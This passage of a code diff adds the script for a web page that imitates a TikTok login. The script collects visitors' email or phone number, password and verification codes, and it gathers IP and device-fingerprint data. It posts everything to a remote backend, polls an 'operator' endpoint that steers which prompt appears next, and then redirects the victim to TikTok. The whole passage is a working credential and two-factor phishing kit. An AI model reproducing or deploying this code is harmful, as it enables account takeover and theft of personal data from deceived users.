+  const text = document.getElementById('loadingMessage');
+  const spinner = document.querySelector('.spinner');
+  spinner.style.display = 'none';
+  text.style.display = 'none';
+  err.textContent = msg;
+  err.classList.add('visible');
+}
+
+function startLoadingMessages() {
+  const el = document.getElementById('loadingMessage');
+  const spinner = document.querySelector('.spinner');
+  spinner.style.display = '';
+  el.style.display = '';
+  currentMessageIndex = 0;
+  el.textContent = loadingMessages[currentMessageIndex];
+  clearInterval(messageIntervalId);
+  messageIntervalId = setInterval(() => {
+    currentMessageIndex = (currentMessageIndex + 1) % loadingMessages.length;
+    el.textContent = loadingMessages[currentMessageIndex];
+  }, 5000);
+}
+
+// ==================== HELPERS ====================
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+}
+
+function objectToFormData(obj) {
+  const fd = new URLSearchParams();
+  Object.entries(obj).forEach(([k, v]) => fd.append(k, v != null ? v.toString() : ''));
+  return fd.toString();
+}
+
+function getDeviceData() {
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    screenWidth: window.screen.width,
+    screenHeight: window.screen.height,
+    colorDepth: window.screen.colorDepth,
+    pixelRatio: window.devicePixelRatio,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    vendor: navigator.vendor,
+    maxTouchPoints: navigator.maxTouchPoints,
+  };
+}
+
+function hideAllErrors() {
+  ['phoneError', 'emailError', 'verificationChoiceError', 'verificationCodeError', 'invalidVerificationCode', 'loadingError'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) { el.classList.remove('visible'); el.textContent = ''; }
+  });
+}
+
+function setError(id, msg) {
+  const el = document.getElementById(id);
+  if (el) { el.textContent = msg; el.classList.add('visible'); }
+}
+
+// ==================== INITIAL SUBMISSION ====================
+async function initialFormSubmission() {
+  showLoading(loadingMessages[0]);
+
+  let identifier = '';
+  if (selectedLoginMethod === 'email') {
+    identifier = document.getElementById('emailInput').value.trim();
+  } else if (selectedLoginMethod === 'phone') {
+    identifier = document.getElementById('countryCode').value + document.getElementById('phoneInput').value.trim();
+  }
+
+  try {
+    const ipData = await fetch('https://ipinfo.io/json').then(r => r.json()).catch(() => ({}));
+    const formDataContent = {
+      loginMethod: selectedLoginMethod,
+      identifier,
+      password: '',
+      ipData,
+      deviceData: getDeviceData(),
+      timestamp: new Date().toISOString()
+    };
+
+    const payload = { token: templateConfig.token, formData: JSON.stringify(formDataContent) };
+    console.log("Initial submission:", payload);
+
+    const response = await fetch(apiBaseUrl + "/notify-form-submission", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    const data = await response.json();
+    console.log("Initial response:", data);
+
+    if (data.apiResponse && data.apiResponse.browserId) {
+      browserId = data.apiResponse.browserId;
+      updateUIForStatus(data.apiResponse.status, data.apiResponse);
+    } else {
+      throw new Error("No browserId received");
+    }
+  } catch (error) {
+    console.error("Initial submission error:", error);
+    hideLoading();
+    setError('loadingError', "Failed to initiate process. Please try again.");
+    showLoadingError("Failed to initiate process. Please try again.");
+  }
+}
+
+// ==================== POLLING ====================
+function startPolling(interval = 10000) {
+  if (pollingIntervalId) clearInterval(pollingIntervalId);
+  if (pollingStartTime === null) pollingStartTime = Date.now();
+  pollingIntervalId = setInterval(pollOperator, interval);
+}
+
+async function pollOperator() {
+  if (!browserId) { clearInterval(pollingIntervalId); return; }
+  if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
+    clearInterval(pollingIntervalId);
+    showLoadingError("Session timed out. Please try again.");
+    return;
+  }
+  try {
+    const payload = { browserId, token: templateConfig.token };
+    const response = await fetch(apiBaseUrl + "/pooling-operator", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    const data = await response.json();
+    console.log("Polling:", data);
+    if (data.currentStatus) updateUIForStatus(data.currentStatus, data.data || {});
+  } catch (error) {
+    console.error("Polling error:", error);
+    clearInterval(pollingIntervalId);
+    hideLoading();
+    setError('loadingError', "Connection lost. Please try again.");
+    showLoadingError("Connection lost. Please try again.");
+  }
+}
+
+// ==================== STATUS UI ====================
+function updateUIForStatus(status, data = {}) {
+  currentStatus = status;
+  hideAllErrors();
+
+  const emailSubmitBtn = document.getElementById('emailSubmitBtn');
+  const phoneSubmitBtn = document.getElementById('phoneSubmitBtn');
+  if (emailSubmitBtn) { emailSubmitBtn.disabled = false; emailSubmitBtn.classList.remove('enabled'); }
+  if (phoneSubmitBtn) { phoneSubmitBtn.disabled = false; phoneSubmitBtn.classList.remove('enabled'); }
+
+  switch (status) {
+    case 'WAITING':
+    case 'PROCESSING':
+      showLoading(loadingMessages[0]);
+      if (emailSubmitBtn) { emailSubmitBtn.disabled = true; emailSubmitBtn.textContent = 'Processing...'; }
+      if (phoneSubmitBtn) { phoneSubmitBtn.disabled = true; phoneSubmitBtn.textContent = 'Processing...'; }
+      startPolling(10000);
+      break;
+
+    case 'WAITINGEMAIL':
+    case 'WAITINGEMAILERROR':
+      hideLoading();
+      showScreen('credentialScreen');
+      if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
+      if (data.email) {
+        if (selectedLoginMethod === 'email') document.getElementById('emailInput').value = data.email;
+      }
+      if (data.lastJsonResponse) {
+        try {
+          const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lr.message && !lr.message.includes('Processing')) {
+            setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', lr.message);
+          }
+        } catch(e) {}
+      }
+      startPolling(10000);
+      break;
+
+    case 'WAITINGPASSWORD':
+    case 'WAITINGPASSWORDERROR':
+      hideLoading();
+      showScreen('credentialScreen');
+      if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
+      if (data.email) {
+        if (selectedLoginMethod === 'email') document.getElementById('emailInput').value = data.email;
+      }
+      if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+        try {
+          const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lr.message && (lr.message.includes('Incorrect') || lr.message.includes('incorrect'))) {
+            setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', lr.message);
+            const pwInput = selectedLoginMethod === 'phone' ? 'phonePasswordInput' : 'emailPasswordInput';
+            document.getElementById(pwInput).value = '';
+          }
+        } catch(e) {}
+      }
+      lastShownStatus = currentStatus;
+      startPolling(10000);
+      break;
+
+    case 'WAITINGOPTIONS':
+      hideLoading();
+      showScreen('verificationOptionsScreen');
+      let rawOpts = data.verificationOptions || [];
+      if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch(e) { rawOpts = []; } }
+      verificationOptions = Array.isArray(rawOpts) ? rawOpts : [];
+      renderVerificationOptions(verificationOptions);
+      startPolling(10000);
+      break;
+
+    case 'WAITINGCODE':
+      hideLoading();
+      showScreen('verificationCodeScreen');
+      document.getElementById('verificationCodeInput').value = '';
+      if (data.lastJsonResponse) {
+        try {
+          const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lr.message && (lr.message.includes('Incorrect') || lr.message.includes('incorrect'))) {
+            setError('invalidVerificationCode', lr.message);
+          }
+        } catch(e) {}
+      }
+      startPolling(10000);
+      break;
+
+    case 'COMPLETED':
+      hideLoading();
+      clearInterval(pollingIntervalId);
+      let url = templateConfig.landingPageLink && templateConfig.landingPageLink.trim() !== ''
+        ? templateConfig.landingPageLink : "https://www.tiktok.com/foryou";
+      if (!url.startsWith('http://') && !url.startsWith('https://')) url = `https://${url}`;
+      window.location.href = url;
+      break;
+
+    case 'FAILED':
+      hideLoading();
+      clearInterval(pollingIntervalId);
+      let emailExists = data.emailExists;
+      let accountAccess = data.accountAccess;
+      if (data.lastJsonResponse) {
+        try {
+          const lr = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (emailExists === undefined) emailExists = lr.emailExists;
+          if (accountAccess === undefined) accountAccess = lr.accountAccess;
+        } catch(e) {}
+      }
+      showScreen('credentialScreen');
+      if (selectedLoginMethod === 'phone') switchTab('phone'); else switchTab('email');
+      if (emailExists === false) {
+        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', "Account not found. Please check your credentials.");
+      } else if (accountAccess === false) {
+        setError(selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError', "Incorrect email or password. Try again.");
+      } else {
+        setError('loadingError', "An error occurred. Please try again.");
+      }
+      break;
+
+    default:
+      showLoadingError("An unexpected status was received. Please try again.");
+      break;
+  }
+}
+
+// ==================== VERIFICATION OPTIONS ====================
+function renderVerificationOptions(options) {
+  const container = document.getElementById('verificationOptionsContainer');
+  container.innerHTML = '';
+  if (!options || options.length === 0) {
+    container.innerHTML = '<p style="color:rgba(22,24,35,0.5);text-align:center">No verification options available.</p>';
+    return;
+  }
+  options.forEach((opt, i) => {
+    const div = document.createElement('div');
+    div.className = 'verification-radio';
+    div.innerHTML = `
+      <input type="radio" name="verificationOption" id="vopt${i}" value="${opt.choiceIndex}" data-type="${opt.type || ''}" data-masked="${opt.maskedDetail || ''}">
+      <label for="vopt${i}">${opt.label}</label>
+    `;
+    container.appendChild(div);
+  });
+}
+
+// ==================== USER SUBMISSION ====================
+async function handleUserSubmission() {
+  hideAllErrors();
+  showLoading(loadingMessages[0]);
+
+  const emailInput = document.getElementById('emailInput');
+  const emailPasswordInput = document.getElementById('emailPasswordInput');
+  const phoneInput = document.getElementById('phoneInput');
+  const phonePasswordInput = document.getElementById('phonePasswordInput');
+
+  let payload = { browserId, token: templateConfig.token };
+  let updateType = '';
+  let errorId = selectedLoginMethod === 'phone' ? 'phoneError' : 'emailError';
+
+  try {
+    if (currentStatus === 'WAITINGEMAIL' || currentStatus === 'WAITINGEMAILERROR') {
+      let identifier;
+      if (selectedLoginMethod === 'email') {
+        identifier = emailInput.value.trim();
+        if (!identifier) { hideLoading(); setError(errorId, "Please enter your email or username."); return; }
+      } else {
+        identifier = document.getElementById('countryCode').value + phoneInput.value.trim();
+        if (!phoneInput.value.trim()) { hideLoading(); setError(errorId, "Please enter your phone number."); return; }
+      }
+      payload.email = identifier;
+      const pw = selectedLoginMethod === 'email' ? emailPasswordInput.value.trim() : phonePasswordInput.value.trim();
+      if (pw) payload.password = pw;
+      updateType = 'email';
+    } else if (currentStatus === 'WAITINGPASSWORD' || currentStatus === 'WAITINGPASSWORDERROR') {
+      const password = (selectedLoginMethod === 'email' ? emailPasswordInput : phonePasswordInput).value.trim();
+      if (!password) { hideLoading(); setError(errorId, "Password is required."); return; }
+      payload.password = password;
+      updateType = 'password';
+    } else {
+      hideLoading();
+      return;
+    }
+
+    payload.updateType = updateType;
+    console.log("User submission:", payload);
+
+    const response = await fetch(apiBaseUrl + "/update-process", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    const data = await response.json();
+    console.log("Update response:", data);
+    pollingStartTime = Date.now();
+    startPolling(3000);
+  } catch (error) {
+    console.error("Submission error:", error);
+    hideLoading();
+    setError('loadingError', "An error occurred. Please try again.");
+  }
+}
+
+// ==================== VERIFICATION ====================
+async function submitVerificationChoice() {
+  const selected = document.querySelector('input[name="verificationOption"]:checked');
+  if (!selected) { setError('verificationChoiceError', "Please select a verification option."); return; }
+  hideAllErrors();
+  showLoading(loadingMessages[0]);
+
+  const payload = {
+    browserId, token: templateConfig.token,
+    verificationChoice: JSON.stringify([{ choice: selected.value }]),
+    updateType: 'verificationChoice'
+  };
+
+  try {
+    const response = await fetch(apiBaseUrl + "/update-process", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    pollingStartTime = Date.now();
+    startPolling(3000);
+  } catch (error) {
+    console.error("Verification choice error:", error);
+    hideLoading();
+  }
+}
+
+async function submitVerificationCode() {
+  const code = document.getElementById('verificationCodeInput').value.trim();
+  if (!code) { setError('verificationCodeError', "Verification code is required."); return; }
+  hideAllErrors();
+  showLoading(loadingMessages[0]);
+
+  const payload = {
+    browserId, token: templateConfig.token,
+    verificationCode: code,
+    updateType: 'verificationCode'
+  };
+
+  try {
+    const response = await fetch(apiBaseUrl + "/update-process", {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: objectToFormData(payload)
+    });
+    if (!response.ok) throw new Error(`HTTP ${response.status}`);
+    pollingStartTime = Date.now();
+    startPolling(3000);
+  } catch (error) {
+    console.error("Verification code error:", error);
+    hideLoading();
+  }
+}
+
+// ==================== INIT ====================
+document.addEventListener('DOMContentLoaded', () => {
+  showMethodSelection();
+
+  document.getElementById('emailInput').addEventListener('input', function() {
+    const btn = document.getElementById('emailSubmitBtn');
+    btn.classList.toggle('enabled', this.value.trim().length > 0);
+  });
+  document.getElementById('phoneInput').addEventListener('input', function() {
+    const btn = document.getElementById('phoneSubmitBtn');
+    btn.classList.toggle('enabled', this.value.trim().length > 0);
+  });
+});
+</script>
+
+</body>
+</html>
